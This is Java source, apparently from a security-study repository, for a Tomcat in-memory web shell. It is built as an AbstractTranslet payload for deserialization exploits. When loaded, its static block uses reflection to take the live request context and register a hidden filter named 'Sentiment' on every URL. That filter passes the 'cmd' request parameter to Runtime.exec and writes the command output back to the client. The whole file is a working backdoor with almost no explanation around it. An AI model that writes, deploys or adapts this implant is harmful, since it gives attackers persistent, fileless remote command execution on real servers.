package com.javasec.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.*;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.Map;

public class TomcatFilterMemshell extends AbstractTranslet implements Filter {
    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //修改static final
            setFinalStatic(WRAP_SAME_OBJECT_FIELD);
            setFinalStatic(lastServicedRequestField);
            setFinalStatic(lastServicedResponseField);

            //静态变量直接填null即可
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);


            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null) || lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedRequestField.set(null, new ThreadLocal());
                lastServicedResponseField.set(null, new ThreadLocal());
            }else {
                ServletRequest servletRequest = lastServicedRequest.get();
                ServletResponse servletResponse = lastServicedResponse.get();

                //开始注入内存马
                ServletContext servletContext = servletRequest.getServletContext();
                Field context = servletContext.getClass().getDeclaredField("context");
                context.setAccessible(true);
                // ApplicationContext 为 ServletContext 的实现类
                ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
                Field context1 = applicationContext.getClass().getDeclaredField("context");
                context1.setAccessible(true);
                // 这样我们就获取到了 context
                StandardContext standardContext = (StandardContext) context1.get(applicationContext);

                //1、创建恶意filter类
                Filter filter = new TomcatFilterMemshell();

                //2、创建一个FilterDef 然后设置filterDef的名字，和类名，以及类
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName("Sentiment");
                filterDef.setFilterClass(filter.getClass().getName());

                // 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中
                standardContext.addFilterDef(filterDef);
                //3、将FilterDefs 添加到FilterConfig
                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                filterConfigs.put("Sentiment",filterConfig);

                //4、创建一个filterMap
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName("Sentiment");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                //将自定义的filter放到最前边执行
                standardContext.addFilterMapBefore(filterMap);

                servletResponse.getWriter().write("Inject Success !");
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        if (request.getParameter("cmd") != null) {
            //String[] cmds = {"/bin/sh","-c",request.getParameter("cmd")}
            String[] cmds = {"cmd", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            byte[] bcache = new byte[1024];
            int readSize = 0;
            try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                while ((readSize = in.read(bcache)) != -1) {
                    outputStream.write(bcache, 0, readSize);
                }
                response.getWriter().println(outputStream.toString());
            }
        }


    }

    @Override
    public void destroy() {
    }
    public static void setFinalStatic(Field field) throws NoSuchFieldException, IllegalAccessException {
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }
}